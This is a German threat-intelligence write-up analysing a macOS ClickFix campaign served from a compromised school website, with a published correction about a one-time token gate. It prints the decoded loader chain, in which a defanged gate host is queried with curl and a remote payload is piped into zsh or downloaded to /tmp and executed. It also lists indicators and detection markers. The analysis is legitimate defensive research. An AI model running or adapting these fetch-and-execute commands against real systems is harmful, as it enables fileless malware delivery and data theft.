# Ein Versuch: was ein Einmal-Gate tatsächlich schützt

## Was ein Einmal-Gate mit der Vorfallsbearbeitung macht — und warum der Quelltext diesen Fall nicht von einem legitimen unterscheiden konnte

> **Richtiggestellt am 06.08.2026.** Diese Notiz erschien zuerst als *„eine ClickFix-Kette,
> die sich kein zweites Mal analysieren lässt"*. Zwei Tage später wurde die Kette
> vollständig zurückgeholt, und diese Behauptung hielt nicht. Der beschriebene Mechanismus
> war real und richtig beobachtet; der daraus gezogene Schluss war zu stark. Siehe
> Abschnitt 8.

*Erstdokumentation, August 2026*

---

## Kurzfassung

Die Website einer deutschen Grundschule lieferte ein gefälschtes Cloudflare-Overlay zur
„menschlichen Verifizierung" aus, das Besucher anwies, `⌘+Leertaste → Terminal → ⌘+V →
Enter` zu drücken. Beim Seitenaufruf hatte JavaScript längst einen Befehl in die
Zwischenablage geschrieben. Wer ihn einfügt, lädt eine zweite Stufe und leitet sie direkt
in `zsh` — nichts landet auf der Festplatte, und die betroffene Person führt den Code unter
ihren eigenen Rechten aus. Gatekeeper, XProtect und Download-Sperren kommen dabei gar nicht
erst zu Wort.

Bemerkenswert ist nicht die Technik, die ist gut dokumentiert. Bemerkenswert ist das
**Gate**: Die erste Stufe meldet sich mit einem opferindividuellen Token bei einem
Kontrollserver, und dieses Token wird **genau einmal** akzeptiert. Diese eine Entwurfsentscheidung stellt die
gesamte Untersuchung um — nicht weil sie Analyse unmöglich macht, sondern weil sie ihr eine
Uhr stellt. Abschnitt 8 hält fest, wie dieser Unterschied auf die harte Tour gelernt
wurde.

Diese Notiz ist das operative Gegenstück zum [Ad-Shield-Fall](../2026-08-ad-shield-welt-de/),
der aus sehr ähnlich aussehenden Belegen den gegenteiligen Schluss zog. Zusammen gelesen
ergeben die beiden erst das Argument.

---

## 1. Die Kette

**Stufe 0 — die Zwischenablage.** 477 Bytes, beim Seitenaufruf geschrieben:

```sh
_7dcf=<hex>;eval "$(printf '%s' '<base64>'|base64 -d)"
```

**Stufe 1 — nach einer Dekodierung:**

```sh
_xr=$(curl -s 'hxxp://enter-pverif-code[.]info/p/<opferindividuelles-token>')
if [ "$_xr" = "ok" ]; then
    curl -s $(echo "<base64>" | openssl base64 -d -A) | zsh
fi
```

**Stufe 2 — aus der inneren Schicht:**

```
hxxps://ferncurrent14[.]com/curl/<kampagnen-token>
```

**Stufe 3 — zurückgeholt am 06.08.2026** (siehe Abschnitt 8). Stufe 2 feuert in dem
Moment, in dem das Opfer einfügt, eine Telemetrie-Meldung ab und lädt dann eine universelle
Mach-O:

```
POST hxxps://grove-89[.]com/api/metrics/run?event=pasted     Header: user, BuildID
     hxxps://ferncurrent14[.]com/<id>/DANTE/update  ->  /tmp/helper
     xattr -c ; chmod +x ; ausfuehren
```

Drei Details, die man behalten sollte:

- Stufe 1 läuft über **einfaches HTTP**, Stufe 2 über HTTPS. Die Gate-Abfrage ist damit auf
  der Leitung mitlesbar — ein Geschenk an die Netzwerkerkennung und eine merkwürdige Wahl
  des Betreibers.
- Die innere Schicht nutzt `openssl base64 -d -A` statt `base64 -d`. Gleiches Ergebnis,
  andere Zeichenfolge — genug, um an einer naiven Signatur vorbeizukommen, die auf die
  naheliegende Form abstellt.
- Die Wegwerf-Variablenpräfixe (`_7dcf`, `_xr`) wechseln zwischen Kampagnen, sind innerhalb
  einer aber stabil. Das macht sie zu brauchbarem Jagdmaterial und zu schlechtem
  Blockmaterial.

---

## 2. Das Gate und was es kostet

Der Kontrollserver antwortet je Token einmal mit `ok`. Beim zweiten Abruf kommt nichts
zurück, und die `if`-Bedingung greift nie.

Dem Betreiber bringt das saubere Telemetrie pro Klick und macht wiederholte Ausführung in
Analyseumgebungen wertlos. Für die Untersuchung heißt es:

- **Ein verbrauchtes Token bleibt verbraucht.** Wenn der Zwischenablage-Inhalt vor einem
  liegt, kann es längst verbrannt sein — durch das Opfer oder durch den eigenen ersten
  Blick. Dieses eine Token kommt nicht zurück.
- **Ein gesicherter Einzeiler ist nicht übertragbar.** An eine Kollegin weitergegeben oder
  in eine Sandbox gelegt, liefert er nichts. Was wie ein reproduzierbares Artefakt aussieht,
  ist eine Einmal-Fahrkarte.
- **Nachträgliche Analyse ist unmöglich, wiederholte nicht.** Genau diesen Unterschied hat
  die erste Fassung dieser Notiz verfehlt. Ein frischer Besuch einer noch ausliefernden
  Lure erzeugt ein neues Token, und die Kette läuft erneut — siehe Abschnitt 8.

Praktisch kehrt das die übliche Reihenfolge um. Normalerweise: beobachten, Hypothese
bilden, dann sammeln, was die Hypothese braucht. Gegen ein Einmal-Gate gilt: **zuerst
sichern, in voller Treue, dann nachdenken.** Den Zwischenablage-Inhalt byteweise
festhalten, bevor er dekodiert, bevor er irgendwo eingefügt, bevor entschieden wird, was er
ist.

Aufgeschrieben klingt das selbstverständlich. Es ist nicht das, was passiert, wenn eine
Seite kaputt aussieht und der erste Reflex ist, daran herumzuprobieren.

---

## 3. Das Zeitfenster, gemessen

Am 04.08.2026 enthielt ein öffentlicher Feed einen Schwung von 29 Apex-Domains mit dem Tag
ClickFix, eingereicht um 16:56:50 UTC. Eine davon war `ferncurrent14[.]com` — derselbe
Stufe-2-Host wie in diesem Fall, was den Schwung überhaupt erst mit ihm verband.

Acht dieser Ziele wurden kurz nach 18:08 UTC abgerufen, reines Herunterladen. Rund
**70 Minuten** nach der öffentlichen Meldung:

| Zieltyp | Ergebnis |
|---|---|
| Angreiferregistrierte Hosts (3) | 404 hinter Cloudflare, 521 und 522 — Origins weg |
| Ein Lure-Pfad, eine Stunde zuvor noch da | 404 |
| Kompromittierte legitime Seiten (4) | saubere Originalseiten, keine Injektion |

Eine YARA-Regel für die Lure-Seite matchte auf **nichts**. Ein Referer-Bypass mit
macOS-Safari-Kennung änderte nichts.

Entscheidend war eine passive, keine aktive Beobachtung: Die Screenshots des öffentlichen
Scandienstes, aufgenommen zum Einreichungszeitpunkt, zeigen für dieselben Domains **die
gleichen sauberen Seiten** und `403 Forbidden` für die angreifereigenen Hosts. Der Scanner
war genauso ausgesperrt worden wie wir. Ein archiviertes DOM hätte also auch nicht
geholfen — im Archiv stand von vornherein nichts.

Das Gating ist damit stärker als eine Filterung über User-Agent oder Referer.
One-Shot-pro-IP, Geofilterung oder eine erforderliche Weiterleitungskette aus Malvertising
passen alle zum Befund. Welcher Mechanismus es auch ist — die operative Zahl zählt: **Bei
dieser Kampagne ist eine Lure innerhalb eines Fensters von deutlich unter einer Stunde
erreichbar, wenn überhaupt, und von einer Forschungsadresse aus womöglich gar nicht.**

---

## 4. Der Cluster

Die 29 Domains trennen sich sauber nach Alter, und die Trennung deckt sich mit den Rollen:

- **Acht Domains, innerhalb von sechs Tagen registriert** — die beweglichen Teile.
  Gating-Hosts, Loader-Hosts, Wegwerfnamen. Zwei davon, `enter-pverif-code[.]info` (das
  Gate dieses Falls) und `makeverizyjar[.]info`, waren beide null Tage alt und antworteten
  mit *identischer Antwortlänge*. Gleiche Rolle, gleiches Alter, gleiche Größe — und, wie
  Abschnitt 6 zeigt, dasselbe autonome System. Erst das hob es von der Vermutung zur
  Einschätzung.
- **21 etablierte Seiten**, etwa ein bis zehn Jahre alt, überwiegend WordPress. Sie sind
  die Auslieferungsfläche — die kompromittierten Websites anderer Leute.

Eine davon, `v-k[.]com[.]ua`, trug einen Pfad namens `vcapcha.ps1`. Eine PowerShell-Datei,
benannt nach einem gefälschten Captcha, ist der Windows-Arm derselben Technik aus demselben
Cluster. Bis dahin galt eine Windows-Variante als „wahrscheinlich, aber unbeobachtet"; die
Frage ist damit erledigt.

**Die 21 sind Geschädigte, keine Infrastruktur.** Sie stehen hier zur Einordnung und
bleiben bewusst aus den Indikatordateien heraus. Sie zu blockieren bestraft ihre eigenen
Nutzer und schafft ein Delisting-Problem für Leute, die nichts getan haben. Der Unterschied
zwischen „taucht in einer Kampagne auf" und „gehört zur Kampagne" ist die eigentliche
Arbeit.

---

## 5. Was diese Notiz nicht belegt

- **Das Payload.** Stufe 2 und Stufe 3 wurden am 06.08.2026 beide zurückgeholt, der
  Stealer selbst jedoch nicht: Stufe 3 ist ein Loader, dessen Nutzlast verschlüsselt in der
  eigenen Datensektion liegt und nur im Speicher entschlüsselt wird. Die Familienzuordnung
  — AMOS-Linie — stützt sich auf Ketten- und Binärmerkmale und ist als *eingeschätzt*
  vermerkt, nicht als bestätigt. In den maschinenlesbaren Feldern bleibt sie `unknown`.
- **Attribution.** Nichts hier sagt, wer dahintersteht. Eine Länderkennung ist kein
  Standort, ein Standort ist keine Staatsangehörigkeit, und gemietete Infrastruktur ist
  kein Eigentum. Die Edge-Kennungen in Serverantworten bezeichnen den nächstgelegenen
  Standort des *Abrufenden*, nicht den des Ziels.

  Das gilt uneingeschränkt auch für die Hosting-Daten in Abschnitt 6. Beide Gate-Domains
  lösen auf Origin-IPs in einem einzigen autonomen System auf, und dieses System trägt
  eine Registrierung auf den Seychellen, seine Netzblöcke eine türkische. Das sind
  Registereinträge. Sie verorten keinen Server und sagen nichts darüber, wer die Kampagne
  betreibt. Der Wert des Fundes liegt darin, dass ein benennbarer Provider existiert, dem
  man Rechtshilfe zustellen kann — nicht darin, dass sich eine Flagge anheften ließe.
- **Das Ausmaß.** Wie viele Menschen das Overlay gesehen und wie viele ihm gefolgt sind,
  beantworten allein die Serverprotokolle der betroffenen Seite. Die liegen beim Betreiber.

---

## 6. Indikatoren

Vollständig und maschinenlesbar, CC0: [`evidence/iocs.txt`](evidence/iocs.txt).

```
enter-pverif-code.info      Gate Stufe 1 / Klick-Telemetrie (einfaches HTTP)
makeverizyjar.info          Schwester-Gate, gleiches Hosting-AS
ferncurrent14.com           Loader-Host Stufe 2 und 3
grove-89.com                Einfüge-Konversionsmeldung (ergänzt 06.08.2026)
```

`grove-89.com` hatte zum Zeitpunkt des Fundes überhaupt keine öffentliche Scan-Historie —
und feuert, bevor das Payload geladen wird. Damit ist es das früheste Netzsignal der Kette.

**Die Gates stehen nicht hinter dem Proxy.** Nachgeprüft am 06.08.2026 gegen zwei
unabhängige Resolver: Beide Gate-Domains nutzen Cloudflare-Nameserver, ihre `A`-Records
sind aber ungeproxied — die Origins liegen offen. Nur der Stufe-2-Host ist tatsächlich
proxied.

```
178.16.52.101   enter-pverif-code.info   AS202412
158.94.208.87   makeverizyjar.info       AS202412
188.114.96.3    ferncurrent14.com        AS13335 (Cloudflare) — proxied
```

`AS202412` ist *OMEGATECH-AS, Omegatech LTD*, ein autonomes System, registriert am
12.01.2026.

Das zählt doppelt. Es hebt `makeverizyjar.info` über den Zufall gleicher Antwortlänge und
gleichen Registrierungsalters hinaus — die Domain teilt sich jetzt die Hosting-Infrastruktur
mit dem bestätigten Gate, was deutlich belastbarer ist, auch wenn ein AS ebenso
Unbeteiligte beherbergt. Und es bleibt etwas übrig, woran eine Ermittlung ansetzen kann:
Eine ungeproxiede Origin benennt einen Provider, dem sich eine Bestandsdatenauskunft
zustellen lässt — was bei einer Cloudflare-fronted Domain nicht geht.

Wozu das ausdrücklich *nicht* taugt, steht in Abschnitt 5.

**Verhaltensmarker** — dauerhafter als die Domains, die im Tagesrhythmus rotieren:

```
eval "$(printf '%s' '<b64>'|base64 -d)"     äußere Schicht
openssl base64 -d -A                        zweite Dekodierschicht
curl -s … | zsh                             dateilose Ausführung
_7dcf / _xr                                 Wegwerf-Variablenpräfixe
```

Erkennungsregeln, die dekodierte Kette, die vollständige Cluster-Auswertung zu allen 29
Domains und das Werkzeug zur Sicherung liegen in einem eigenen Repository:
**[macos-threat-tracking](https://github.com/raimurokko/macos-threat-tracking)**. Das dort
abgelegte Zwischenablage-Sample trägt die MD5 `2169ff5e7be77fc3ff72758f9fa50658` — die
Referenz-Prüfsumme zweier veröffentlichter YARA-Regeln. Die Regeln lassen sich damit gegen
genau das Artefakt prüfen, aus dem sie entstanden sind.

---

## 7. Die Lehre und ihr Zwilling

Der methodische Kern steht in Abschnitt 2: **Gegen Einmal-Infrastruktur kommt das Sichern
vor der Analyse.** Es gibt keinen zweiten Blick, also ist die Treue beim ersten Kontakt das
Einzige, was überlebt.

Der unangenehmere Punkt zeigt sich aber erst, wenn man diesen Fall neben die
[Ad-Shield-Notiz](../2026-08-ad-shield-welt-de/) in diesem Repository legt.

Dort lieferte eine große Nachrichtenseite ein obfuskiertes, ins HTML injiziertes Script
aus, mit Attributen zur Umgehung von Optimierern, das eine Domain kontaktierte, die
Filterlisten als Adware führen. Jeder Oberflächenbefund sagte *Kompromittierung*. Es war
eine bezahlte, vom Verlag bewusst eingebundene Funktion.

Hier lieferte eine Schulwebsite ein obfuskiertes, ins HTML injiziertes Script aus, mit
Markern und Umgehungsmerkmalen derselben allgemeinen Form. Jeder Oberflächenbefund sagte
*Kompromittierung*. Diesmal war es eine.

Der Quelltext konnte die beiden nicht unterscheiden. Im ersten Fall kam die Antwort aus der
Domain-Reputation, im zweiten aus dem Verhalten der Infrastruktur — dem Gate, dem Token,
der Rotation. In keinem der beiden kam sie daher, den Code genauer zu lesen.

Das ist der Erwähnung wert, weil der Reflex in die andere Richtung geht: **Wenn injizierter
Fremdcode in einer Seite auftaucht, in der man ihn nicht erwartet hat, löst mehr
Code-Analyse das selten auf.** Auflösen lässt es sich, indem man klärt, wer der Absender
ist und wie sich seine Infrastruktur verhält.

---

## 8. Richtigstellung (06.08.2026): das Payload war doch zu beschaffen

Das ursprüngliche Argument lautete, ein Einmal-Gate kehre die Reihenfolge einer
Untersuchung um: Das Token verbrenne beim ersten Kontakt, das Payload sei fort, bevor man
merkt, dass man es braucht.

Zwei Tage später wurde die vollständige Kette zurückgeholt — Stufe 2, Stufe 3 und die
Mach-O.

**Das Token ist einmalig. Die Lure ist es nicht.** Ein zweiter Besuch einer noch
ausliefernden Lure-Seite erzeugt ein frisches Token, und die Kette läuft von vorn. Was das
Gate verhindert, ist *nachträgliche* Analyse: Zu einem verbrauchten Token führt kein Weg
zurück, und ein gesicherter Einzeiler funktioniert in fremder Hand nicht. Vorwärts ist
alles erreichbar, rückwärts nichts.

Die richtige Aussage lautet also nicht „das lässt sich kein zweites Mal analysieren",
sondern:

> **Die Belege haben eine Haltbarkeit, und Bereinigung verkürzt sie.**

### Der unangenehme Teil

Diese Frist läuft gegen die Meldearbeit. Jede Stunde, die in die Bereinigung einer
kompromittierten Seite geht, ist eine Stunde näher am Verlust des Samples — und das Sample
entscheidet, ob eine Meldung überhaupt eine Schadsoftware-Familie benennen kann, woran sich
die Empfänger orientieren.

Die ursprüngliche Notiz behandelte das als Reihenfolgeproblem, das sich optimieren lässt.
Das ist es nicht. Es ist ein echter Konflikt zwischen zwei Pflichten, und er löst sich
nicht durch geschickte Reihenfolge, sondern durch Parallelität: Die Sicherungsumgebung muss
stehen, **bevor** die erste Meldung hinausgeht, damit beide Stränge nicht um dasselbe
Zeitfenster konkurrieren. Hier taten sie es, und die Sicherung gelang trotzdem. Das war
Glück. Darauf zu planen, dass die Infrastruktur die Reaktion überlebt, ist ein Fehler.

### Was das Sample wert war

- Stufe 3 erwies sich als **Loader, nicht als Stealer** — sechzehn Imports, ein 69.632 Byte
  großer verschlüsselter Block bei Entropie 7,997, dazu `mlock`/`munlock`, um die
  entschlüsselte Nutzlast aus dem Swap zu halten. Das ist eine Anti-Forensik-Maßnahme,
  gerichtet auf genau die Untersuchung, die ein Verteidiger nach einem Vorfall anstellt —
  und aus den Skripten war davon nichts zu sehen.
- In Stufe 2 tauchte eine **Konversionsmeldung** auf: ein POST in dem Moment, in dem das
  Opfer einfügt, noch bevor irgendetwas geladen wird. Das ist eine Erkennungsgelegenheit
  *vor* der Kompromittierung, und sie existierte in keinem der Artefakte aus dem ersten
  Zusammentreffen.
- Zwei nicht standardisierte Request-Header tragen Kampagnen- und Build-Kennungen.

Beim letzten Punkt griff der erste Entwurf der technischen Analyse zu weit, und es lohnt
festzuhalten, warum: Er führte die beobachteten Header-*Werte* als Indikatoren, mit der
Begründung, sie kämen vom Builder und überlebten deshalb eine Domain-Rotation. Diese
Begründung ist plausibel und vollständig unbelegt — es gibt eine Beobachtung. Veröffentlicht
sind jetzt die Header-*Namen*; die Werte stehen in der Analyse, wo man sieht, dass sie
genau einmal vorkamen.

### Angepasste Handlungsempfehlung

1. Ein Einmal-Gate ist eine **Uhr**, kein Schloss.
2. Die Sicherungsumgebung steht, bevor gemeldet wird, nicht danach.
3. **Von der Auslieferung nicht auf die Fähigkeit schließen.** Nach den Skripten sah das
   nach schlichtem Herunterladen und Ausführen aus. Es war ein selbstentschlüsselnder
   In-Memory-Loader — in einem Bericht etwas grundlegend anderes.
4. Erweist sich eine Behauptung als zu stark, wird die Notiz geändert und nicht still
   zurückgezogen. Der Mechanismus war real und richtig beobachtet. Falsch war nur der
   Schluss.

Vollständige technische Darstellung, samt dem, was gegen das Sample nachgerechnet wurde:
[macos-threat-tracking, Kampagne DANTE](https://github.com/raimurokko/macos-threat-tracking/blob/main/campaigns/2026-08-04-cloudflare-clickfix/payload_analysis.md).

---

## 9. Umgang mit dem Fall

Die betroffene Schule wurde am selben Tag unterrichtet, unentgeltlich und ohne
Auftragsinteresse, mit Maßnahmenvorschlägen und einem Textbaustein für die Elternschaft.
**Die Seite wird hier bewusst nicht benannt**, und es wird kein Screenshot von ihr
veröffentlicht: Sie ist Geschädigte, der Betreiber hat die Information zuerst erhalten, und
eine Benennung nützte keinem Verteidiger.

Angreiferkontrollierte Indikatoren werden vollständig veröffentlicht, TLP:CLEAR, weil sie
genau dadurch brauchbar werden. Die beiden Kategorien werden absichtlich getrennt gehalten
— eine Kampagnenbeschreibung, die ihre Opfer benennt, um gründlich zu wirken, hat
Dokumentation mit Bloßstellung verwechselt.

---

*Diese Notiz dokumentiert Beobachtungen vom 04.08.2026 und den folgenden Tagen. Die Analyse
des Zwischenablage-Inhalts erfolgte statisch, es wurde nichts ausgeführt. Infrastruktur
dieser Art ändert sich binnen Tagen; mehrere der genannten Indikatoren waren bereits tot,
als dies geschrieben wurde.*
